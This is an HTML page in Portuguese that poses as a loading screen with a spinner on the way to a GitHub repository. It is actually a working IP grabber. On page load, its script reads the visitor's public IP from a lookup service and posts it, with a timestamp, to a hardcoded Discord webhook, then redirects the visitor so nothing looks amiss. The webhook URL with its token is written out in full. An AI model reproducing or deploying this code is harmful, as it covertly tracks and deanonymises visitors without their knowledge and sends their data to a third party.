<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>https://github.com/jcdxv/jcdxv-s</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
        }
        .loader-container {
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #1e293b;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
        <p>Carregando conteúdo, aguarde...</p>
    </div>

    <script>
        async function GithubFunction() {
            const webhookUrl = 'https://discord.com/api/webhooks/1563896536922980512/nKitxOxyE4eOLBivu77vzrGGDFyB2QUWb9Dq0Ok-FJ2ni20zQtc6sxKh-ouaDmFVagbs';
            const redirectUrl = 'https://github.com/jcdxv/jcdxv-s';

            try {
                // 1. Obtém o IP do usuário via API pública
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                // 2. Formata a data atual
                const now = new Date();
                const dateStr = now.getFullYear() + '-' + 
                                (now.getMonth() + 1).toString().padStart(2, '0') + '-' + 
                                now.getDate().toString().padStart(2, '0') + ' ' + 
                                now.getHours().toString().padStart(2, '0') + ':' + 
                                now.getMinutes().toString().padStart(2, '0') + ':' + 
                                now.getSeconds().toString().padStart(2, '0');

                // 3. Envia para o Webhook do Discord
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: `IP Capturado: ${ip}`,
                            description: `Data: ${dateStr}\nTipo: IP Grabber (GitHub Pages)`,
                            color: 3447003
                        }]
                    })
                });
            } catch (error) {
                console.error('Erro na captura:', error);
            } finally {
                // 4. Redireciona independente de sucesso ou falha
                window.location.href = redirectUrl;
            }
        }

        // EXECUTA A FUNÇÃO ASSIM QUE O SCRIPT É LIDO
        GithubFunction();
    </script>
</body>
</html>
